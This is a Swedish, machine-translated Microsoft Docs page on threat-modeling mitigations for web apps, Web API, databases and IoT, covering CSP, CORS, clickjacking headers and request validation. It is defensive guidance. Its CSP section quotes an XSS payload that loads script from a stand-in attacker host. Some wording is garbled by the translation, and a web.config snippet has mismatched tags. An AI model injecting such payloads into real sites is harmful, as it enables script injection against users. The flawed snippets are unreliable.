---
title: Configuration Management - Microsoft Hotmodelleringsverktyg – Azure | Microsoft Docs
description: åtgärder för hot som exponeras i Threat Modeling Tool
services: security
documentationcenter: na
author: jegeib
manager: jegeib
editor: jegeib
ms.assetid: na
ms.service: security
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 02/07/2017
ms.author: jegeib
ms.openlocfilehash: bd1d3c71660ae584b0aa57c7cc765fdc519f4b1b
ms.sourcegitcommit: 5839af386c5a2ad46aaaeb90a13065ef94e61e74
ms.translationtype: MT
ms.contentlocale: sv-SE
ms.lasthandoff: 03/19/2019
ms.locfileid: "57863601"
---
# <a name="security-frame-configuration-management--mitigations"></a>Security ram: Konfigurationshantering | Åtgärder 
| Produkt/tjänst | Artikel |
| --------------- | ------- |
| **Webbprogram** | <ul><li>[Implementera Content Security Policy (CSP) och inaktivera infogade javascript](#csp-js)</li><li>[Aktivera webbläsarens XSS-filter](#xss-filter)</li><li>[ASP.NET-program måste du inaktivera spårning och felsökning före distributionen](#trace-deploy)</li><li>[Åtkomst från tredje part JavaScript-skript från betrodda källor](#js-trusted)</li><li>[Se till att autentiserade ASP.NET-sidor införliva Användargränssnittet Redressing eller klicka på fästpunkter försvar](#ui-defenses)</li><li>[Se till att endast betrodda ursprung är tillåtna om CORS har aktiverats på ASP.NET-webbprogram](#cors-aspnet)</li><li>[Aktivera ValidateRequest attributet på ASP.NET-sidor](#validate-aspnet)</li><li>[Använd lokalt värdbaserade senaste versionerna av JavaScript-bibliotek](#local-js)</li><li>[Inaktivera automatisk MIME-kontroll](#mime-sniff)</li><li>[Ta bort standardserver rubriker på Windows Azure Web Sites att undvika fingeravtryck](#standard-finger)</li></ul> |
| **Databas** | <ul><li>[Konfigurera en Windows-brandvägg för Databasmotoråtkomst](#firewall-db)</li></ul> |
| **Webb-API** | <ul><li>[Se till att endast betrodda ursprung är tillåtna om CORS har aktiverats på ASP.NET Web API](#cors-api)</li><li>[Kryptera avsnitt i konfigurationsfilerna för webb-API som innehåller känslig information](#config-sensitive)</li></ul> |
| **IoT-enheter** | <ul><li>[Se till att alla administrationsgränssnitt säkras med starka autentiseringsuppgifter](#admin-strong)</li><li>[Se till att okänd kod inte kan köras på enheter](#unknown-exe)</li><li>[Kryptera OS och fler partitioner av IoT-enheter med BitLocker](#partition-iot)</li><li>[Kontrollera att endast de minsta tjänster/funktionerna som är aktiverade på enheter](#min-enable)</li></ul> |
| **IoT Field Gateway** | <ul><li>[Kryptera OS och fler partitioner av IoT fält-Gateway med BitLocker](#field-bit-locker)</li><li>[Se till att standard-inloggningsuppgifter för fält-gateway ändras under installationen](#default-change)</li></ul> |
| **IoT Cloud Gateway** | <ul><li>[Kontrollera att Molngatewayen använder en process för att hålla den anslutna enheter inbyggda programvaran uppdaterad](#cloud-firmware)</li></ul> |
| **Datorn Förtroendegräns** | <ul><li>[Se till att enheter har slutpunkt säkerhetskontroller som konfigurerats enligt organisationens principer](#controls-policies)</li></ul> |
| **Azure Storage** | <ul><li>[Se till att säker hantering av nycklar för Azure storage-åtkomst](#secure-keys)</li><li>[Se till att endast betrodda ursprung är tillåtna om CORS har aktiverats på Azure storage](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[Aktivera begränsning funktionens WCF-tjänsten](#throttling)</li><li>[WCF-utlämnande via metadata](#info-metadata)</li></ul> | 

## <a id="csp-js"></a>Implementera Content Security Policy (CSP) och inaktivera infogade javascript

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Gäller inte  |
| **Referenser**              | [En introduktion till innehåll säkerhetsprincip](https://www.html5rocks.com/en/tutorials/security/content-security-policy/), [innehåll Security principreferens](https://content-security-policy.com/), [säkerhetsfunktioner](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [introduktion till innehåll säkerhetsprincip](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy) , [Kan jag använda CSP?](https://caniuse.com/#feat=contentsecuritypolicy) |
| **Steg** | <p>Content Security Policy (CSP) är en skydd på djupet säkerhetsmekanism, en W3C som standard, som gör det möjligt för web application ägare att ha kontroll på det innehåll som är inbäddad i sin plats. CSP: N har lagts till som en HTTP-Svarsrubrik på webbservern och tillämpas på klientsidan som webbläsare. Det är en lista över tillåtna-baserad princip – en webbplats kan deklarera en uppsättning betrodda domäner från det aktiva innehållet, t.ex. JavaScript kan läsas in.</p><p>CSP ger följande säkerhet fördelar:</p><ul><li>**Skydd mot XSS:** Om en sida är sårbar för XSS kan kan en angripare utnyttja den på 2 sätt:<ul><li>Mata in `<script>malicious code</script>`. Den här utnyttja fungerar inte på grund av CSP grundläggande begränsning-1</li><li>Mata in `<script src=”http://attacker.com/maliciousCode.js”/>`. Den här utnyttja fungerar inte eftersom angripare kontrollerad domän inte kan CSP-vitlistan domäner</li></ul></li><li>**Kontroll över dataexfiltrering:** Om skadlig innehåll på en webbsida försöker ansluta till en extern webbplats och stjäla data, avbryts anslutningen av CSP: N. Det beror på att domänen inte CSP-vitlistan</li><li>**Skydd mot Klicka fästpunkter:** Klicka fästpunkter är en attack-teknik med som en angripare kan inrikta en äkta webbplats och tvinga användare att klicka på UI-element. För närvarande uppnås skydd mot Klicka fästpunkter genom att konfigurera ett svar-X-ram – Rubrikalternativ. Den här rubriken värnar om inte alla webbläsare och gå framåt CSP blir ett standardiserat sätt att skydda mot fästpunkter klickar du på</li><li>**I realtid attack rapporteringsserver:** Om det finns en-angrepp på en webbplats med CSP-aktiverad, sätts webbläsare automatiskt ett meddelande till en slutpunkt som konfigurerats på webbservern. På så sätt kan CSP fungerar som en i realtid varningssystem.</li></ul> |

### <a name="example"></a>Exempel
Exempel på princip: 
```csharp
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Den här principen tillåter att skript att läsa in bara från webbprogrammets server och google analytics-server. Skript som läses in från någon annan webbplats kommer att avvisas. Om CSP är aktiverat på en webbplats, inaktiveras automatiskt följande funktioner för att minska XSS-attacker. 

### <a name="example"></a>Exempel
Infogade skript körs inte. Följande är exempel på infogade skript 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick=”function(){}”>
javascript:alert(1);
```

### <a name="example"></a>Exempel
Strängar utvärderas inte som kod. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a id="xss-filter"></a>Aktivera webbläsarens XSS-filter

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Gäller inte  |
| **Referenser**              | [XSS Protection Filter](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) |
| **Steg** | <p>Konfiguration för svar på X XSS skydd rubrik styr webbläsarens mellan skript filter. Den här svarshuvud kan ha följande värden:</p><ul><li>`0:` Detta inaktiverar filtret</li><li>`1: Filter enabled` Om en cross site scripting attack upptäcks kommer webbläsaren för att kunna stoppa angreppet, sanera sidan</li><li>`1: mode=block : Filter enabled`. Snarare än sanera sidan när en XSS-attack har identifierats, förhindrar webbläsaren återgivningen av sidan</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. Webbläsaren ska rensa sidan och rapportera överträdelsen.</li></ul><p>Det här är en krom funktion använder CSP överträdelse rapporter för att skicka information till en URI som du önskar. De senaste 2 alternativ betraktas som säkra värden.</p>|

## <a id="trace-deploy"></a>ASP.NET-program måste du inaktivera spårning och felsökning före distributionen

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Gäller inte  |
| **Referenser**              | [ASP.NET-felsökning översikt](https://msdn2.microsoft.com/library/ms227556.aspx), [ASP.NET spårning översikt](https://msdn2.microsoft.com/library/bb386420.aspx), [så här: Aktivera spårning för ett ASP.NET-program](https://msdn2.microsoft.com/library/0x5wc973.aspx), [så här: Aktivera felsökning för ASP.NET-program](https://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Steg** | När spårning är aktiverat för sidan varje webbläsare som begär den hämtar även spårningsinformation som innehåller data om interna Servertillstånd och arbetsflöde. Den här informationen kan vara känslig säkerhet. När felsökning är aktiverat för sidan, leda fel händer på servern till en fullständig stack spårningsdata som visas i webbläsaren. Dessa data kan exponera känsliga information om serverns arbetsflöde. |

## <a id="js-trusted"></a>Åtkomst från tredje part JavaScript-skript från betrodda källor

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Gäller inte  |
| **Referenser**              | Gäller inte  |
| **Steg** | JavaScript från tredje part-skript som innehåller endast från betrodda källor. Referens-slutpunkter bör alltid vara om SSL. |

## <a id="ui-defenses"></a>Se till att autentiserade ASP.NET-sidor införliva Användargränssnittet Redressing eller klicka på fästpunkter försvar

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Gäller inte  |
| **Referenser**              | [OWASP fästpunkter Defense facit blad klickar du på](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [IE Internals - bekämpa Klicka fästpunkter med X-ram-alternativ](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
| **Steg** | <p>Klicka på fästpunkter, kallas även en ”Användargränssnittet hur de attack”, är när en angripare använder flera lager för transparent eller täckande att lura en användare klickar på en knapp eller länk på en annan sida när de avsikten är att klicka på den översta sidan.</p><p>Dessa lager uppnås genom att utforma en skadlig sida med en iframe som läser in offrets sidan. Därför kapar angriparen ”” klick avsedda för sina sidan och skicka dem till en annan sida, är förmodligen ägs av ett annat program, domän, eller båda. För att förhindra Klicka fästpunkter attacker, ange rätt X-ram-Options HTTP-svarshuvuden som instruerar webbläsaren att inte tillåta synkroniseringstecken från andra domäner</p>|

### <a name="example"></a>Exempel
Rubriken X-ram-OPTIONS kan ställas in via IIS web.config. Web.config kodfragmentet för platser som aldrig bör utformas: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Exempel
Web.config kod för platser som bara bör utformas av sidor i samma domän: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a id="cors-aspnet"></a>Se till att endast betrodda ursprung är tillåtna om CORS har aktiverats på ASP.NET-webbprogram

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | Webbformulär, MVC5 |
| **Attribut**              | Gäller inte  |
| **Referenser**              | Gäller inte  |
| **Steg** | <p>Webbläsarskydd förhindrar att en webbsida gör AJAX-begäranden till en annan domän. Den här begränsningen kallas för princip om samma ursprung och förhindrar skadliga webbplatser från att läsa känsliga data från en annan plats. Men kan ibland det bli ombedd att använda API: er på ett säkert sätt som andra platser kan använda. Mellan Origin Resource Sharing (CORS) är en W3C-standard som gör att en server att lätta princip om samma ursprung. Med hjälp av CORS, kan en server uttryckligen tillåta vissa cross-origin-begäranden medan andra avvisas.</p><p>CORS är säkrare och mer flexibel än tidigare tekniker, till exempel JSONP. I grunden är att aktivera CORS översätts till att lägga till några HTTP-svarshuvuden (Access - Control-*) till webb-program och detta kan göras på ett par olika sätt.</p>|

### <a name="example"></a>Exempel
Om åtkomst till Web.config är tillgänglig kan CORS läggas med följande kod: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="https://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Exempel
Om det inte går att få åtkomst till web.config, konfigureras CORS genom att lägga till följande c#-kod: 
```csharp
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://example.com")
```

Observera att det är viktigt att se till att listan med ursprung i ”Access-Control-Allow-Origin”-attribut har angetts till en begränsad och betrodda uppsättning ursprung. Inte kan konfigurera detta på ett olämpligt sätt (t.ex. ställa in värdet som ' *') gör att skadliga webbplatser att utlösa mellan origin-begäranden till webbprogrammet > utan begränsningar, vilket gör programmet sårbara för CSRF-attacker. 

## <a id="validate-aspnet"></a>Aktivera ValidateRequest attributet på ASP.NET-sidor

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | Webbformulär, MVC5 |
| **Attribut**              | Gäller inte  |
| **Referenser**              | [Begära verifiering - att förhindra attacker skript](https://www.asp.net/whitepapers/request-validation) |
| **Steg** | <p>Begäran om verifiering, en funktion i ASP.NET sedan version 1.1, förhindrar att servern tar emot innehåll som innehåller icke kodade HTML. Den här funktionen är utformad för att förhindra vissa skript-inmatningsattacker där klienten skriptkod eller HTML kan vara omedvetet skickas till en server, lagras och sedan presenteras för andra användare. Fortfarande rekommenderar vi att du verifierar att alla indata och HTML koda det när det är lämpligt.</p><p>Begäran om verifiering utförs genom att jämföra alla indata till en lista över kan vara skadliga. Om en matchning uppstår, ASP.NET genererar en `HttpRequestValidationException`. Begära verifiering funktionen är aktiverad som standard.</p>|

### <a name="example"></a>Exempel
Men kan den här funktionen inaktiveras på sidnivå: 
```XML
<%@ Page validateRequest="false" %> 
```
eller, på programnivå 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Observera att begära valideringsfunktionen stöds inte och är inte en del av MVC6 pipeline. 

## <a id="local-js"></a>Använd lokalt värdbaserade senaste versionerna av JavaScript-bibliotek

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Gäller inte  |
| **Referenser**              | Gäller inte  |
| **Steg** | <p>Utvecklare som använder standard JavaScript-bibliotek som måste använda JQuery godkända versioner av vanliga JavaScript-bibliotek som inte innehåller kända säkerhetsbrister. Ett bra tips är att använda den mest senaste versionen av bibliotek, eftersom de innehåller security korrigeringar av kända sårbarheter i äldre version.</p><p>Om den senaste versionen inte kan användas på grund av kompatibilitetsskäl, den nedan minimiversioner ska användas.</p><p>Godkända minsta versioner:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery verifiera 1.9</li><li>JQuery Mobile 1.0.1</li><li>JQuery cykel 2,99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**Ajax Control Toolkit**<ul><li>Ajax Control Toolkit 40412</li></ul></li><li>**ASP.NET Web Forms och Ajax**<ul><li>ASP.NET Web Forms och Ajax 4</li><li>ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Ladda aldrig något JavaScript-bibliotek från externa webbplatser som offentliga CDN-nät</p>|

## <a id="mime-sniff"></a>Inaktivera automatisk MIME-kontroll

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Gäller inte  |
| **Referenser**              | [IE8 En del Security V: Heltäckande skydd](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [MIME-typ](https://en.wikipedia.org/wiki/Mime_type) |
| **Steg** | Rubriken X-innehåll-typ-Options är ett HTTP-huvud som gör att utvecklare kan ange att innehållet inte ska vara MIME-någon lyssnar. Den här rubriken är utformad för att minska MIME-kontroll attacker. För varje sida som kan innehålla användare kontrolleras innehåll, måste du använda HTTP-huvud X-innehåll-typ-alternativ: nosniff. Om du vill aktivera nödvändiga huvudet globalt för alla sidor i programmet, kan du göra något av följande|

### <a name="example"></a>Exempel
Lägg till rubriken i web.config-filen om programmet körs genom att Internet Information Services (IIS) 7 och senare. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Exempel
Lägg till sidhuvud via globala programmet\_BeginRequest 
```csharp
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Exempel
Implementera anpassade HTTP-modul 
```csharp
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Exempel
Du kan aktivera rubriken krävs endast för specifika sidor genom att lägga till enskilda svar: 

```csharp
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a id="standard-finger"></a>Ta bort standardserver rubriker på Windows Azure Web Sites att undvika fingeravtryck

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | EnvironmentType - Azure |
| **Referenser**              | [Tar bort standardserver huvuden på Windows Azure Web Sites](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Steg** | Rubriker, till exempel Server, X-drivna-av, X-AspNet-Version avslöja information om servern och den underliggande tekniken. Det rekommenderas att ignorera dessa huvuden därmed förhindrar fingeravtryck programmet |

## <a id="firewall-db"></a>Konfigurera en Windows-brandvägg för Databasmotoråtkomst

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Databas | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | SQL Azure, OnPrem |
| **Attribut**              | Ej tillämpligt, SQL-Version - V12 |
| **Referenser**              | [Så här konfigurerar du en Azure SQL database-brandvägg](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [konfigurerar en Windows-brandvägg för Databasmotoråtkomst](https://msdn.microsoft.com/library/ms175043) |
| **Steg** | Brandväggssystem förhindra obehörig åtkomst till datorresurser. Om du vill få åtkomst till en instans av SQL Server Database Engine genom en brandvägg måste konfigurera du brandväggen på datorn som kör SQL Server och tillåta åtkomst |

## <a id="cors-api"></a>Se till att endast betrodda ursprung är tillåtna om CORS har aktiverats på ASP.NET Web API

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webb-API | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | MVC 5 |
| **Attribut**              | Gäller inte  |
| **Referenser**              | [Aktivera Cross-Origin-begäranden i ASP.NET Web API 2](https://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [ASP.NET webb-API - CORS-stöd i ASP.NET Web API 2](https://msdn.microsoft.com/magazine/dn532203.aspx) |
| **Steg** | <p>Webbläsarskydd förhindrar att en webbsida gör AJAX-begäranden till en annan domän. Den här begränsningen kallas för princip om samma ursprung och förhindrar skadliga webbplatser från att läsa känsliga data från en annan plats. Men kan ibland det bli ombedd att använda API: er på ett säkert sätt som andra platser kan använda. Mellan Origin Resource Sharing (CORS) är en W3C-standard som gör att en server att lätta princip om samma ursprung.</p><p>Med hjälp av CORS, kan en server uttryckligen tillåta vissa cross-origin-begäranden medan andra avvisas. CORS är säkrare och mer flexibel än tidigare tekniker, till exempel JSONP.</p>|

### <a name="example"></a>Exempel
I App_Start/WebApiConfig.cs, lägger du till följande kod i metoden WebApiConfig.Register 
```csharp
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Exempel
EnableCors attribut kan tillämpas på åtgärdsmetoder i en kontroll på följande sätt: 

```csharp
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Observera att det är viktigt att se till att listan med ursprung i EnableCors attribut har angetts till en begränsad och betrodda uppsättning ursprung. Inte kan konfigurera detta på ett olämpligt sätt (t.ex. ställa in värdet som ' *') gör att skadliga webbplatser att utlösa mellan origin-begäranden till API: N utan någon begränsning > vilket gör API: et sårbara för CSRF-attacker. EnableCors kan vara dekorerad på domänkontrollanten nivå. 

### <a name="example"></a>Exempel
Om du vill inaktivera CORS på en viss metod i en klass, kan DisableCors-attributet användas som visas nedan: 
```csharp
[EnableCors("https://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of the [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webb-API | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | MVC 6 |
| **Attribut**              | Gäller inte  |
| **Referenser**              | [Aktivera Cross-Origin-begäranden (CORS) i ASP.NET Core 1.0](https://docs.asp.net/en/latest/security/cors.html) |
| **Steg** | <p>I ASP.NET Core 1.0 kan CORS aktiveras antingen med hjälp av middleware eller MVC. När du använder MVC för att aktivera CORS samma CORS-tjänster används CORS-mellanprogram är dock inte.</p>|

**Metod 1** aktiverar CORS med mellanprogram: Lägg till CORS-mellanprogram i förfrågnings-pipelinen med hjälp av metoden UseCors tillägget om du vill aktivera CORS för hela programmet. En princip för resursdelning mellan ursprung kan anges när du lägger till CORS-mellanprogram med hjälp av klassen CorsPolicyBuilder. Det finns två sätt att göra detta:

### <a name="example"></a>Exempel
Först är att anropa UseCors med en lambda. Lambda tar ett CorsPolicyBuilder-objekt: 
```csharp
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("https://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Exempel
Andra är att definiera en eller flera namngivna CORS-principer och välj sedan principen efter namn under körning. 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("https://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Metod 2** aktiverar CORS i MVC: Utvecklare kan också använda MVC för att tillämpa specifika CORS per åtgärd per styrenhet eller globalt för alla domänkontrollanter.

### <a name="example"></a>Exempel
Per åtgärd: Lägg till attributet [EnableCors] för åtgärden om du vill ange en CORS-princip för en viss åtgärd. Ange namnet på principen. 
```csharp
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Exempel
Per styrenhet: 
```csharp
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Exempel
Globally: 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Observera att det är viktigt att se till att listan med ursprung i EnableCors attribut har angetts till en begränsad och betrodda uppsättning ursprung. Inte kan konfigurera detta på ett olämpligt sätt (t.ex. ställa in värdet som ' *') gör att skadliga webbplatser att utlösa mellan origin-begäranden till API: N utan någon begränsning > vilket gör API: et sårbara för CSRF-attacker. 

### <a name="example"></a>Exempel
Inaktivera CORS för en domänkontrollant eller en åtgärd med attributet [DisableCors]. 
```csharp
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a id="config-sensitive"></a>Kryptera avsnitt i konfigurationsfilerna för webb-API som innehåller känslig information

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webb-API | 
| **SDL fas**               | Distribution |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Gäller inte  |
| **Referenser**              | [Anvisningar: Kryptera konfigurationsavsnitt i ASP.NET 2.0 med hjälp av DPAPI](https://msdn.microsoft.com/library/ff647398.aspx), [att ange en Konfigurationsprovider för skyddade](https://msdn.microsoft.com/library/68ze1hb2.aspx), [med hjälp av Azure Key Vault för att skydda programhemligheter](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
| **Steg** | Konfigurationsfiler, till exempel Web.config, appsettings.json ofta används för att lagra känslig information, inklusive användarnamn, lösenord, anslutningssträngar för databasen och krypteringsnycklar. Om du inte skyddar den här informationen kan är ditt program sårbar för attacker eller illvilliga användare att känslig information som användarnamn och lösenord, databasnamn och servernamn. Baserat på typen av distribution (azure/on-premises), kryptera känsliga grupper i konfigurationsfiler med hjälp av DPAPI eller tjänster som Azure Key Vault. |

## <a id="admin-strong"></a>Se till att alla administrationsgränssnitt säkras med starka autentiseringsuppgifter

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | IoT-enheter | 
| **SDL fas**               | Distribution |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Gäller inte  |
| **Referenser**              | Gäller inte  |
| **Steg** | Alla administrativa gränssnitt som exponerar enhet eller fält-gateway bör skyddas med hjälp av starka autentiseringsuppgifter. Även andra gränssnitt som Wi-Fi, SSH, filresurser, FTP bör skyddas med starka autentiseringsuppgifter. Standard svaga lösenord ska inte användas. |

## <a id="unknown-exe"></a>Se till att okänd kod inte kan köras på enheter

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | IoT-enheter | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Gäller inte  |
| **Referenser**              | [Aktivera säker start och BitLocker enhetskryptering på Windows 10 IoT Core](https://docs.microsoft.com/windows/iot-core/secure-your-device/securebootandbitlocker) |
| **Steg** | Säker Start i UEFI begränsar systemet så att endast körning av binärfiler som signerats av en angiven myndighet. Den här funktionen förhindrar okänd kod körs på plattformen och potentiellt minskad säkerhetstillståndet för den. Aktivera säker Start i UEFI och begränsa listan över certifikatutfärdare som är betrodda för signering av kod. Logga alla kod som visas på enheten med en av de betrodda utfärdarna. |

## <a id="partition-iot"></a>Kryptera OS och fler partitioner av IoT-enheter med BitLocker

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | IoT-enheter | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Gäller inte  |
| **Referenser**              | Gäller inte  |
| **Steg** | Windows 10 IoT Core implementerar en förenklad version av BitLocker enhetskryptering, vilket är starkt beroende på förekomsten av en TPM på plattformen, inklusive nödvändiga preOS-protokollet i UEFI som utför nödvändiga mätning av faktisk användning. De här mätningarna preOS Kontrollera att Operativsystemet senare har slutgiltiga koll på hur Operativsystemet startades. Kryptera OS-partitioner som använder BitLocker och alla ytterligare partitioner även om de kan innehålla känsliga data. |

## <a id="min-enable"></a>Kontrollera att endast de minsta tjänster/funktionerna som är aktiverade på enheter

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | IoT-enheter | 
| **SDL fas**               | Distribution |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Gäller inte  |
| **Referenser**              | Gäller inte  |
| **Steg** | Aktivera inte eller stänga av alla funktioner och tjänster i Operativsystemet som inte krävs för driften av lösningen. För t.ex. Om enheten inte kräver ett gränssnitt som ska distribueras, installera Windows IoT Core i fjärradministrerad läge. |

## <a id="field-bit-locker"></a>Kryptera OS och fler partitioner av IoT fält-Gateway med BitLocker

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | IoT Field Gateway | 
| **SDL fas**               | Distribution |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Gäller inte  |
| **Referenser**              | Gäller inte  |
